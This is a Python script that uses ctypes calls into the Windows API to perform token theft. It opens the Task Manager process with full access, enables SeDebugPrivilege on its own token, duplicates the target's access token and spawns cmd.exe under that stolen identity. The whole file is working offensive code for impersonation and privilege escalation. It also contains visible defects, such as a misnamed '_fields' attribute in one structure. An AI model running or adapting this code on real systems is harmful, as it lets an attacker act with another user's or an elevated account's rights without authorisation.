#Program to impersonate a token and open a new process with that token.


import ctypes
from ctypes.wintypes import *

class LUID(ctypes.Structure):
    _fields_=[
        ("LowPart",DWORD),
        ("HighPart",LONG)
            ]

class LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_=[
        ("Luid",LUID),
        ("Attributes",DWORD)
            ]
class PRIVILEGE_SET(ctypes.Structure):
    _fields_=[("PrivilegeCount",DWORD),
              ("Control",DWORD),
              ("Privilege",LUID_AND_ATTRIBUTES)
              ]
class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_=[("PrivilegeCount",DWORD),
              ("Privilege",LUID_AND_ATTRIBUTES)
              ]

class SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields=[("nLength",DWORD),
             ("lpSecurityDescriptor",LPVOID),
             ("bInheritHandle",BOOL)
             ]
class STRATUPINFO(ctypes.Structure):
    _fields_=[("cb",DWORD),
              ("lpReserved",LPSTR),
              ("lpDesktop",LPSTR),
              ("lpTitle",LPSTR),
              ("dwX",DWORD),
              ("dwY",DWORD),
              ("dwXSize",DWORD),
              ("dwYSize",DWORD),
              ("dwXCountChars",DWORD),
              ("dwYCountChars",DWORD),
              ("dwFillAttribute",DWORD),
              ("dwFlags",DWORD),
              ("wShowWindow",WORD),
              ("cbReserved2",WORD),
              ("lpReserved2",LPBYTE),
              ("hStdInput",HANDLE),
              ("hStdOutput",HANDLE),
              ("hStdError",HANDLE)
             ]
class PROCESS_INFORMATION(ctypes.Structure):
    _fields_=[("hProcess",HANDLE),
              ("hThread",HANDLE),
              ("dwProcessId",DWORD),
              ("dwThreadId",DWORD)
              ]
#Method to find the given process Window and return a handle(Not a privileged one with accessess)

def Find_Window(u_handle,k_handle):
    WindowName="Task Manager"
    lpClassName=None
    lpWindowName = ctypes.c_char_p(WindowName.encode('utf-8'))
    print(lpWindowName)
    response = u_handle.FindWindowA(lpClassName,lpWindowName)
    error= k_handle.GetLastError()
    if error != 0 :
        print("Error code is {0}.Could not find window".format(error))


    if response >=0 :
        hWnd = response
        return hWnd
    else:
        print("Could not grab a handle")

#Method to open a privileged handle (It uses the non Privileged handle obtained from previous function,obtains process id
#from that and opens a handle with 'PROCESS_ALL_ACCESS' privileges.This function returns a privileged handle to the process.

def Get_Process_Id(u_handle,k_handle,hWnd,PROCESS_ALL_ACCESS):

    lpdwProcessId=ctypes.c_ulong()
    response=u_handle.GetWindowThreadProcessId(hWnd,ctypes.byref(lpdwProcessId))
    error=k_handle.GetLastError()
    if error != 0:
        print("error code is {0}.Could not get Process Id".format(error))

    if response >=0:
        return lpdwProcessId
    else:
        print("Could not grab process Id")

def Open_Process(PROCESS_ALL_ACCESS,k_handle,lpdwProcessId):

    dwDesiredAccess=PROCESS_ALL_ACCESS
    bInheritHandle= False
    handle=k_handle.OpenProcess(dwDesiredAccess,bInheritHandle,lpdwProcessId)
    error1=k_handle.GetLastError()
    if error1 != 0:
        print(error1)
    if handle <= 0:
        print("handle not created")
    else:
       return handle

#Method to open handle to access token of the process with Desired access.This function returns handle to the process token.

def Open_Access_Token_handle(k_handle,a_handle,handle,TOKEN_ALL_ACCESS):
    ProcessHandle=handle
    DesiredAccess=TOKEN_ALL_ACCESS
    TokenHandle=ctypes.c_void_p()

    token_handle=a_handle.OpenProcessToken(ProcessHandle,DesiredAccess,ctypes.pointer(TokenHandle))

    if token_handle ==0:
        print("error code {0}".format(k_handle.GetLastError()))
    else:
        return TokenHandle

#This Method Looks up for specific privileges in on the token using handle obtained from previous function.
#Returns whether a token has a particular privilege enabled/disabled.

def Look_up_Privilege(a_handle,k_handle,luid,privilege_set,Luid_and_attributes,SE_PRIVILEGE_ENABLED,SE_PRIVILEGE_DISABLED,TokenHandle):
    lpSystemName=None
    lpName="SeDebugPrivilege"


    response=a_handle.LookupPrivilegeValueW(lpSystemName,lpName,ctypes.byref(luid))

    if response == 0:
        print("error code is : {0}".format(k_handle.GetLastError()))
    else:
        if luid:
            print(luid.LowPart,luid.HighPart)
        else:
            print("luid not found")
#parameters for PrivilegeCheck API call
    pfResult=ctypes.c_long()
#Assiging values to PRIVILEGE_SET structure
    privilege_set.PrivilegeCount=1
    privilege_set.Privilege=Luid_and_attributes
#Assinging values to LUID_AND_ATTRIBUTES structure
    privilege_set.Privilege.Luid=luid
    privilege_set.Privilege.Attributes=SE_PRIVILEGE_ENABLED
    priv_response=a_handle.PrivilegeCheck(TokenHandle,ctypes.byref(privilege_set),ctypes.byref(pfResult))

    if priv_response==0:
        print("Privilege check did not work.Error code is : {0}".format(k_handle.GetLastError()))
    else:
        print(priv_response)

    if pfResult:
        print("Privilege is Enabled")
        return privilege_set.Privilege.Attributes

    else:
        print("privilege is not enabled")
        return privilege_set.Privilege.Attributes


# Method to adjust token privileges(Flip whatever the set privilege is)

def Adjust_Token_Privileges(a_handle,k_handle,luid,privilege_set,Luid_and_attributes,Token_Privileges,TokenHandle):
    # parameters for AdjustTokenPrivileges API call
    DisableAllPrivileges=False
    NewState=Token_Privileges
    BufferLength=ctypes.sizeof(NewState)
    PreviousState=ctypes.c_void_p()
    ReturnLength=ctypes.c_void_p()
    NewState.PrivilegeCount=1
    NewState.Privilege=privilege_set.Privilege

    adjust_priv_response=a_handle.AdjustTokenPrivileges(TokenHandle,
                                                    DisableAllPrivileges,
                                                    ctypes.byref(NewState),
                                                    BufferLength,
                                                    ctypes.byref(PreviousState),
                                                    ctypes.byref(ReturnLength)
                                                    )
    if adjust_priv_response == 0:
        print("We could not adjust token .Error code is : {0}".format(k_handle.GetLastError()))
    else:
        print("Adjusted the privileges")
        return

#Function to duplicate the token of the given process .Returns the duplicate token.

def Duplicate_token(a_handle,k_handle,TokenHandle,TOKEN_ALL_ACCESS):
    hExistingToken = TokenHandle
    dwDesiredAccess = TOKEN_ALL_ACCESS
    lpTokenAttributes = SECURITY_ATTRIBUTES()
    ImpersonationLevel = 2  # Set to SecurityImpersonation enum
    TokenType = 1  # Set to Token_Type enum as Primary
    phNewToken = ctypes.c_void_p()
    lpTokenAttributes.nLength = ctypes.sizeof(lpTokenAttributes)
    lpTokenAttributes.lpSecurityDescriptor = ctypes.c_void_p()
    lpTokenAttributes.bInheritHandle = False
    response = a_handle.DuplicateTokenEx(hExistingToken, dwDesiredAccess,ctypes.byref (lpTokenAttributes), ImpersonationLevel, TokenType,
                                ctypes.byref(phNewToken))
    if response==0:
        print("Could not duplicate the token. Error code {0}".format(k_handle.GetLastError()))
    else:
        print("got the token")
        return phNewToken

#Function to create process with the duplicated token.Returns information of the new process created.

def Create_Process_with_Token(a_handle,k_handle,DuplicateToken):
    hToken = DuplicateToken
    dwLogonFlags = 0x00000001
    lpApplicationName = "C:\Windows\System32\cmd.exe"
    lpCommandLine = None
    dwCreationFlags = 0x00000010
    lpEnvironment = ctypes.c_void_p()
    lpCurrentDirectory = None
    lpStartupInfo = STRATUPINFO()
    lpProcessInformation = PROCESS_INFORMATION()

    lpStartupInfo.dwFlags = 0x00000001
    lpStartupInfo.wShowWindow = 0x1
    lpStartupInfo.cb = ctypes.sizeof(lpStartupInfo)
    response=a_handle.CreateProcessWithTokenW(
                                                hToken,
                                                dwLogonFlags,
                                                lpApplicationName,
                                                lpCommandLine,
                                                dwCreationFlags,
                                                lpEnvironment,
                                                lpCurrentDirectory,
                                                ctypes.byref(lpStartupInfo),
                                                ctypes.byref(lpProcessInformation)
                                            )
    if response == 0:
        print("could not create the process.Error code {0}".format(k_handle.GetLastError()))
    else:
        print("Created process")
        return lpProcessInformation
# Main function that sets all the variables and calls all other functions

def Main():

    #All the constants required for the program

    PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xfff)
    # Privilege Enabled/Disabled Mask

    SE_PRIVILEGE_ENABLED = 0x00000002
    SE_PRIVILEGE_DISABLED = 0x00000000

    # Token Access Rights
    STANDARD_RIGHTS_REQUIRED = 0x000F0000
    STANDARD_RIGHTS_READ = 0x00020000
    TOKEN_ASSIGN_PRIMARY = 0x0001
    TOKEN_DUPLICATE = 0x0002
    TOKEN_IMPERSONATION = 0x0004
    TOKEN_QUERY = 0x0008
    TOKEN_QUERY_SOURCE = 0x0010
    TOKEN_ADJUST_PRIVILEGES = 0x0020
    TOKEN_ADJUST_GROUPS = 0x0040
    TOKEN_ADJUST_DEFAULT = 0x0080
    TOKEN_ADJUST_SESSIONID = 0x0100
    TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY)
    TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED |
                        TOKEN_ASSIGN_PRIMARY |
                        TOKEN_DUPLICATE |
                        TOKEN_IMPERSONATION |
                        TOKEN_QUERY |
                        TOKEN_QUERY_SOURCE |
                        TOKEN_ADJUST_PRIVILEGES |
                        TOKEN_ADJUST_GROUPS |
                        TOKEN_ADJUST_DEFAULT |
                        TOKEN_ADJUST_SESSIONID)

    #All the libraries required for the calls
    u_handle = ctypes.WinDLL("User32.dll")
    k_handle = ctypes.WinDLL("Kernel32.dll")
    a_handle=ctypes.WinDLL("Advapi32.dll")

    #Structure instances initiated

    luid=LUID()
    privilege_set=PRIVILEGE_SET()
    Luid_and_attributes= LUID_AND_ATTRIBUTES()
    Token_Privileges= TOKEN_PRIVILEGES()


    #Function Calls

    #WindowName=input("Enter the process name to adjust privileges:")

    hWnd=Find_Window(u_handle,k_handle)

    ProcessId=Get_Process_Id(u_handle,k_handle,hWnd,PROCESS_ALL_ACCESS)

    handle=Open_Process(PROCESS_ALL_ACCESS,k_handle,ProcessId)

    TokenHandle=Open_Access_Token_handle(k_handle,a_handle,handle,TOKEN_ALL_ACCESS)

    #To open a handle to current process.This is done because DuplicateTokenEx cannot be used without SeDebugPrivilege set on current
    #Process token.

    CurrentProcessId=k_handle.GetCurrentProcessId()


    CurrentProcessHandle=Open_Process(PROCESS_ALL_ACCESS,k_handle,CurrentProcessId)


    #To open handle to current process access token and adjust the "SeDebugPrivilege"

    CurrentProcessAccessTokenHandle=Open_Access_Token_handle(k_handle,a_handle,CurrentProcessHandle,TOKEN_ALL_ACCESS)


    privilege_set.Privilege.Attributes = Look_up_Privilege(a_handle, k_handle, luid, privilege_set, Luid_and_attributes, SE_PRIVILEGE_ENABLED,
                      SE_PRIVILEGE_DISABLED,CurrentProcessAccessTokenHandle)

    Adjust_Token_Privileges(a_handle, k_handle, luid, privilege_set, Luid_and_attributes, Token_Privileges,
                            CurrentProcessAccessTokenHandle)
    #Duplicate the token of the process you opened

    DuplicateToken=Duplicate_token(a_handle,k_handle,TokenHandle,TOKEN_ALL_ACCESS)


    # Create a new process with that dplicate token as that current user.
    New_Process_information=Create_Process_with_Token(a_handle,k_handle,DuplicateToken)

    print("Information of the new process : {0}".format(New_Process_information))

    print("successful execution")

if __name__ == "__main__":
    Main()
